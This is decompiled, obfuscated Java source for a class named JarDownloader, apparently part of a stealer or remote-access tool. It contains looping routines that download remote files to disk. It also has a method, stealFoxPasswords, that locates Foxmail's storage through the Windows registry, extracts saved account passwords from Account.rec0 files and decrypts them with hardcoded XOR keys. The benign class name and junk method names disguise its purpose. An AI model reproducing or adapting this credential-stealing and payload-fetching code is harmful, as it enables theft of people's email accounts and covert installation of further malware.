package carLambo;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.nio.ByteBuffer;

public class JarDownloader {
   // $FF: synthetic method
   private void sdfsldf(String var1, String var2) {
      while(true) {
         try {
            String var4 = var2;
            String var3 = var1;
            BufferedInputStream var5 = null;
            FileOutputStream var6 = null;
            boolean var11 = false;

            try {
               var11 = true;
               var5 = new BufferedInputStream((new URL(var4)).openStream());
               var6 = new FileOutputStream((new StringBuilder()).insert(0, var3).append("d").toString());
               byte[] var15 = new byte[1024];

               while(true) {
                  int var7;
                  if ((var7 = var5.read(var15, 0, 1024)) == -1) {
                     var11 = false;
                     break;
                  }

                  var6.write(var15, 0, var7);
               }
            } finally {
               if (var11) {
                  if (var5 != null) {
                     var5.close();
                  }

                  if (var6 != null) {
                     var6.close();
                  }

                  (new File((new StringBuilder()).insert(0, var1).append("d").toString())).renameTo(new File(var1));
               }
            }

            var5.close();
            var6.close();
            (new File((new StringBuilder()).insert(0, var1).append("d").toString())).renameTo(new File(var1));
            if ((new File(var1)).exists()) {
               return;
            }

            Thread.sleep(5000L);
         } catch (Exception var14) {
            System.out.println((new StringBuilder()).insert(0, "EXCEPTION: ").append(var2).toString());

            try {
               Thread.sleep(5000L);
            } catch (Exception var12) {
               ;
            }
         }
      }
   }

   // $FF: synthetic method
   static void downloadJarLibrary(JarDownloader unused, String var1, String var2) {
      var2 = var2;
      var1 = var1;

      while(true) {
         try {
            String var3 = var2;
            String var14 = var1;
            BufferedInputStream var4 = null;
            FileOutputStream var5 = null;
            boolean var10 = false;

            try {
               var10 = true;
               var4 = new BufferedInputStream((new URL(var3)).openStream());
               var5 = new FileOutputStream((new StringBuilder()).insert(0, var14).append("d").toString());
               byte[] var15 = new byte[1024];

               int var6;
               while((var6 = var4.read(var15, 0, 1024)) != -1) {
                  var5.write(var15, 0, var6);
               }

               var10 = false;
            } finally {
               if (var10) {
                  if (var4 != null) {
                     var4.close();
                  }

                  if (var5 != null) {
                     var5.close();
                  }

                  (new File((new StringBuilder()).insert(0, var1).append("d").toString())).renameTo(new File(var1));
               }
            }

            var4.close();
            var5.close();
            (new File((new StringBuilder()).insert(0, var1).append("d").toString())).renameTo(new File(var1));
            if ((new File(var1)).exists()) {
               return;
            }

            Thread.sleep(5000L);
         } catch (Exception var13) {
            System.out.println((new StringBuilder()).insert(0, "EXCEPTION: ").append(var2).toString());

            try {
               Thread.sleep(5000L);
            } catch (Exception var11) {
               ;
            }
         }
      }
   }

   JarDownloader(String name, String link) {
      (new Thread(new LibraryDownloader(this, name, link))).start();
   }

   // $FF: synthetic method
   private static void sabretb(String var0, String var1) {
      try {
         BufferedInputStream var2 = null;
         FileOutputStream var3 = null;
         boolean var6 = false;

         try {
            var6 = true;
            var2 = new BufferedInputStream((new URL(var1)).openStream());
            var3 = new FileOutputStream((new StringBuilder()).insert(0, var0).append("d").toString());
            byte[] var8 = new byte[1024];

            while(true) {
               int var4;
               if ((var4 = var2.read(var8, 0, 1024)) == -1) {
                  var6 = false;
                  break;
               }

               var3.write(var8, 0, var4);
            }
         } finally {
            if (var6) {
               if (var2 != null) {
                  var2.close();
               }

               if (var3 != null) {
                  var3.close();
               }

               (new File((new StringBuilder()).insert(0, var0).append("d").toString())).renameTo(new File(var0));
            }
         }

         var2.close();
         var3.close();
         (new File((new StringBuilder()).insert(0, var0).append("d").toString())).renameTo(new File(var0));
      } catch (Exception e) {
         throw new RuntimeException(e);
      }

   }

   public JarDownloader() {
   }

   public String stealFoxPasswords() {
      try {
         StringBuilder var1 = new StringBuilder();
         String var2 = WindowsRegUtil.invokeMethod(-2147483646, "SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command", "", 0);
         var2 = (new StringBuilder()).insert(0, var2.substring(0, var2.indexOf("Foxmail.exe")).replace("\"", "")).append("Storage\\").toString();
         File[] var15;
         int var3 = (var15 = (new File(var2)).listFiles()).length;

         int var4;
         for(int var10000 = var4 = 0; var10000 < var3; var10000 = var4) {
            File var5;
            if ((var5 = var15[var4]).isDirectory() && var5.getAbsolutePath().contains("@")) {
               String var6 = var5.getName();
               String var16 = (new StringBuilder()).insert(0, var5.getAbsolutePath()).append("\\Accounts\\Account.rec0").toString();
               ByteBuffer var7 = ByteBuffer.allocate((int)(var5 = new File(var16)).length());
               FileInputStream var17 = new FileInputStream(var5);
               byte[] var8 = new byte[1024];
               FileInputStream var22 = var17;

               int var9;
               while((var9 = var22.read(var8, 0, 1024)) != -1) {
                  var22 = var17;
                  var7.put(var8, 0, var9);
               }

               byte[] var18;
               int var19 = (var18 = var7.array()).length;
               boolean var20 = false;
               String var21 = "";
               byte var10;
               if (var18[0] == 208) {
                  var10 = 0;
               } else {
                  var10 = 1;
               }

               int var11;
               for(var10000 = var11 = 0; var10000 < var19; var10000 = var11) {
                  if (var18[var11] > 32 && var18[var11] < 127 && var18[var11] != 61) {
                     var21 = (new StringBuilder()).insert(0, var21).append(new String(var18, var11, 1)).toString();
                     String var12 = "";
                     int var13;
                     String var10001;
                     StringBuilder var23;
                     if (!var21.equals("Account") && !var21.equals("POP3Account")) {
                        if (var20 && (var21.equals("Password") || var21.equals("POP3Password"))) {
                           var13 = var11 + 9;
                           if (var10 == 0) {
                              var13 = var11 + 2;
                           }

                           var12 = "";

                           for(byte[] var24 = var18; var24[var13] > 32 && var18[var13] < 127; var24 = var18) {
                              var23 = (new StringBuilder()).insert(0, var12);
                              var10001 = new String(var18, var13, 1);
                              ++var13;
                              var12 = var23.append(var10001).toString();
                           }

                           var12 = (new StringBuilder()).insert(0, "Email: ").append(var6).append("\r\nPassword: ").append(sdfsldf(var10, var12)).append("\r\n\r\n").toString();
                           var1.append(var12);
                           break;
                        }
                     } else {
                        var13 = var11 + 9;
                        if (var10 == 0) {
                           var13 = var11 + 2;
                        }

                        while(var18[var13] > 32 && var18[var13] < 127) {
                           var23 = (new StringBuilder()).insert(0, var12);
                           var10001 = new String(var18, var13, 1);
                           ++var13;
                           var12 = var23.append(var10001).toString();
                        }

                        var20 = true;
                        var11 = var13;
                     }
                  } else {
                     var21 = "";
                  }

                  ++var11;
               }
            }

            ++var4;
         }

         return var1.toString();
      } catch (Exception var14) {
         return "No password found";
      }
   }

   // $FF: synthetic method
   private static String sabretb() {
      String var0 = WindowsRegUtil.invokeMethod(-2147483646, "SOFTWARE\\Classes\\Foxmail.url.mailto\\Shell\\open\\command", "", 0);
      return (new StringBuilder()).insert(0, var0.substring(0, var0.indexOf("Foxmail.exe")).replace("\"", "")).append("Storage\\").toString();
   }

   // $FF: synthetic method
   private static String sdfsldf(int var0, String var1) {
      int[] var2 = new int[]{126, 100, 114, 97, 71, 111, 110, 126};
      int[] var3 = new int[]{126, 70, 64, 55, 37, 109, 36, 126};
      byte var4 = 90;
      if (var0 == 1) {
         var2 = var3;
         var4 = 113;
      }

      var0 = var1.length() / 2;
      int var10 = 0;
      StringBuilder var5 = new StringBuilder();

      int var6;
      int var10000;
      for(var10000 = var6 = 0; var10000 < var0; var10000 = var6) {
         var5.append(Integer.parseInt(var1.substring(var10).substring(0, 2), 16) + "\n");
         ++var6;
         var10 += 2;
      }

      String[] var15;
      int[] var7 = new int[(var15 = var5.toString().split("\n")).length];

      int var8;
      int var10001;
      int var10002;
      for(var10000 = var8 = 0; var10000 < var7.length; var10000 = var8) {
         var10001 = var8;
         var10002 = Integer.parseInt(var15[var8]);
         ++var8;
         var7[var10001] = var10002;
      }

      int[] var9 = var7;
      var7[0] ^= var4;

      int var14;
      for(int[] var17 = var7; var17.length > var2.length; var17 = var9) {
         var3 = new int[var2.length << 1];

         for(var10000 = var14 = 0; var10000 < var2.length; var10000 = var14) {
            var10001 = var14;
            var10002 = var2[var14];
            ++var14;
            var3[var10001] = var10002;
         }

         for(var10000 = var14 = 0; var10000 < var2.length; var10000 = var14) {
            var10001 = var14 + var2.length;
            var10002 = var2[var14];
            ++var14;
            var3[var10001] = var10002;
         }

         var2 = var3;
      }

      StringBuilder var13 = new StringBuilder();

      for(var10000 = var14 = 1; var10000 < var9.length; var10000 = var14) {
         StringBuilder var18 = (new StringBuilder()).append(var9[var14] ^ var2[var14 - 1]);
         ++var14;
         var13.append(var18.append("\n").toString());
      }

      String[] var16;
      var9 = new int[(var16 = var13.toString().split("\n")).length];

      int var11;
      for(var10000 = var11 = 0; var10000 < var16.length; var10000 = var11) {
         var10001 = var11;
         var10002 = Integer.parseInt(var16[var11]);
         ++var11;
         var9[var10001] = var10002;
      }

      String var12 = "";

      for(var10000 = var10 = 0; var10000 < var9.length; var10000 = var10) {
         if (var9[var10] - var7[var10] < 0) {
            var14 = var9[var10] + 255 - var7[var10];
         } else {
            var14 = var9[var10] - var7[var10];
         }

         StringBuilder var20 = (new StringBuilder()).insert(0, var12);
         String var19 = new String(new byte[]{(byte)var14}, 0, 1);
         ++var10;
         var12 = var20.append(var19).toString();
      }

      return var12;
   }
}
